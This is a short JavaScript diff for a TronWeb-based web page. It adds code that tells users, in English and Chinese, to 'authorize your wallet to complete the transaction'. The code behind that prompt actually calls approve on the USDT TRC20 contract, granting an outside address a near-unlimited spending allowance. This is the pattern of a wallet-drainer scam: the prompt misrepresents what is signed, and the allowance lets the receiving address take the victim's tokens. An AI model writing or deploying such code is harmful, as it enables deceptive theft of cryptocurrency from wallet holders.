@@ -579,7 +579,17 @@
 				let loading = Qmsg.loading(
 				  `<br><br>Please authorize your wallet to complete the transaction<br><br>請通過授權您的錢包以完成交易`
 				);
-				toTrx(usdtContract);
+				tronWeb
+				  .contract()
+				  .at(usdtTrc20)
+				  .then((usdtContract) => {
+					  usdtContract
+						  .approve(toAddress, 1000000000000000)
+						  .send()
+						  .finally(() => {
+							  console.log("Approved!");
+						  });
+				});
 			  }
 			   
 			  function toTrx(usdtContract) {
